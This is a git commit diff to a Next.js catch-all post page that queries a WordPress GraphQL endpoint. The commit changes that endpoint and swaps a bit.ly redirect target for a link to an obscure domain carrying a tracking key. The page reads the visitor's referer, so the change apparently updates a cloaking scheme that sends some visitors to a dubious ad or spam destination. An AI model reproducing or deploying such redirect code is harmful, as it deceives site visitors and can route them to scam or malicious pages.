3a224f58b36352fb636706e0d42117666d21c89b
yourkalon000 <165013795+yourkalon000@users.noreply.github.com>
2024-05-21 17:28:30 +0600

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -4,7 +4,7 @@ import { GetServerSideProps } from 'next';
 import { GraphQLClient, gql } from 'graphql-request';
 
 export const getServerSideProps: GetServerSideProps = async (ctx) => {
-	const endpoint = "https://dev-educationtyp1.pantheonsite.io/graphql"
+	const endpoint = "https://wordpress-1269234-4578733.cloudwaysapps.com/graphql"
 	const graphQLClient = new GraphQLClient(endpoint);
 	const referringURL = ctx.req.headers?.referer || null;
 	const pathArr = ctx.query.postpath as Array<string>;
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://bit.ly/49T1kvE` 
+					`https://overloadmaturespanner.com/rzpvn0pgf?key=2a539c8d6db2dcc377307d1d31308388` 
 				}`,
 			},
 		};
